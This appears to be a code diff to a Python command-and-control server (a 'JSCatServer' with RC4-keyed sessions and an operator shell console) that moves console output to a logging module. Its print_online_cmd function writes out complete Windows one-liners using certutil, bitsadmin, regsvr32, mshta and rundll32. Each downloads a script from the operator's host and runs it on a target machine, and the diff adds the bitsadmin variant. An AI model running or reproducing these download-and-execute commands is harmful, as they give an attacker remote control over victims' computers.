@@ -8,8 +8,8 @@ from lib.shell import Shell
 from lib.session import Session
 from lib.server import Server
 from lib.handler import JSCatServer
+from lib.log import Log
 from lib.color import BOLD
-
 
 '''
 上线方式
@@ -19,6 +19,7 @@ from lib.color import BOLD
 def print_online_cmd(host, port):
     print('[*]Execute in client:')
     print('{} -urlcache -split -f http://{}:{}/init css.js && cscript //nologo css.js'.format(BOLD('certutil'), host, port))
+    print('{} /transfer n http://{}:{}/init css.js && cscript //nologo css.js'.format(BOLD('bitsadmin'), host, port))
     print('{} /s /n /u /i:http://{}:{}/file.sct scrobj.dll'.format(BOLD('regsvr32'), host, port))
     print('''{} javascript:eval("x=new ActiveXObject('WinHttp.WinHttpRequest.5.1');x.open('GET','http://{}:{}/init',false);x.send();eval(x.responseText)")(window.close())'''.format(BOLD('mshta'), host, port))
     print('{} javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://{}:{}/init",false);x.send();eval(x.responseText);window.close();'.format(BOLD('rundll32'), host, port))
@@ -46,14 +47,17 @@ def get_rc4_key(new_key):
 def run(ip, port, new_key, sleep_time):
     # 获取当前使用的rc4加密key
     rc4_key = get_rc4_key(new_key)
-    print('[*]server encrypt key is {}'.format(BOLD(rc4_key)))
+    Log.log_message(
+        '[*]server cipher key: {}'.format(BOLD(rc4_key)), log_type=Log.SERVER)
     # 启动http监听服务
     session = Session()
     shell = Shell(session)
     httpd = Server(ip, port, JSCatServer, session, shell, rc4_key, sleep_time)
     httpd.start()
-    print('[*]server running in  {}:{}...'.format(BOLD('0.0.0.0'), BOLD(port)))
-    print('[*]host connect ip is {}:{}...'.format(BOLD(ip), BOLD(port)))
+    Log.log_message(
+        '[*]server running in  {}:{}...'.format(BOLD('0.0.0.0'), BOLD(port)), log_type=Log.SERVER)
+    Log.log_message(
+        '[*]host connect ip is {}:{}...'.format(BOLD(ip), BOLD(port)), log_type=Log.SERVER)
 
     print_online_cmd(ip, port)
     # 控制台命令输入
@@ -64,7 +68,7 @@ def run(ip, port, new_key, sleep_time):
                 exit()
     except KeyboardInterrupt:
         httpd.shutdown()
-        print('server shutdown')
+        Log.log_message('server shutdown', log_type=Log.SERVER)
 
 
 def print_banner():
@@ -77,6 +81,7 @@ _|"""""|_|"""""|_|"""""|_|"""""|_|"""""|
 "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
     '''
     print(banner)
+
 
 def main():
     print_banner()
